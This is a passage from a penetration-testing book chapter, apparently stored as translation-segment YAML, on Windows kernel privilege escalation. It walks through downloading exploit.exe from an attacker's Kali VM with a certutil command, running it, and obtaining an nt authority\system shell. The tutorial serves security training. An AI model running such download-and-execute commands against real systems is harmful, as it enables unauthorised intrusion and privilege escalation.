- en: In order to download the binary onto the target system, we can utilize the **certutil**
    utility. Before we can download the binary, however, we need to navigate to a
    directory where we have read and write permissions. In this case, we will navigate
    to the current user's desktop as shown in the following screenshot:![Figure 5.18
    – Default user directory](Images/B17389_05_018.jpg)
  id: totrans-176
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Figure 5.18 – Default user directory
  id: totrans-177
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'We can now use the **certutil** utility to download the binary from the Kali
    VM to our target system. This can be done by running the following command on
    the target system:'
  id: totrans-178
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**certutil -urlcache -f http://<KALI-VM>/exploit.exe exploit.exe**'
  id: totrans-179
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'We can now run the exploit binary by executing it on the target as follows:'
  id: totrans-180
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**.\exploit.exe**'
  id: totrans-181
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'The output of the preceding command is shown in the following screenshot:'
  id: totrans-182
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 5.19 – Exploit options](Images/B17389_05_019.jpg)'
  id: totrans-183
  prefs: []
  type: TYPE_IMG
- en: Figure 5.19 – Exploit options
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
- en: 'As highlighted in *Figure 5.19*, the exploit requires the user to specify the
    target operating system. This can be done by executing the exploit with the following
    option:'
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
- en: '**.\exploit.exe 7**'
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
- en: 'After running the exploit with the operating system specified, it will take
    a few seconds to complete, after which we should have an elevated shell with **nt
    authority\system** privileges:'
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 5.20 – Manual kernel exploit successful'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_05_020.jpg)'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
- en: Figure 5.20 – Manual kernel exploit successful
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
- en: As highlighted in the preceding screenshot, the exploit ran successfully and
    elevated our privileges automatically.
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
- en: We are now able to successfully run Windows kernel exploits both manually and
    automatically and can begin exploring other privilege escalation vectors.
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  id: totrans-193
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we got started with identifying and running kernel exploits
    automatically with the Metasploit framework. We then looked at how to identify,
    compile, and transfer kernel exploits manually. We then ended the chapter with
    how to execute kernel exploits on the target system successfully in order to elevate
    our privileges on the target system.
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
- en: Now that we have learned how to perform kernel exploitation on Windows, we can
    begin exploring other privilege escalation vectors.
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
- en: In the next chapter, we will explore impersonation attacks on Windows and how
    they can lead to successful privilege escalation.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
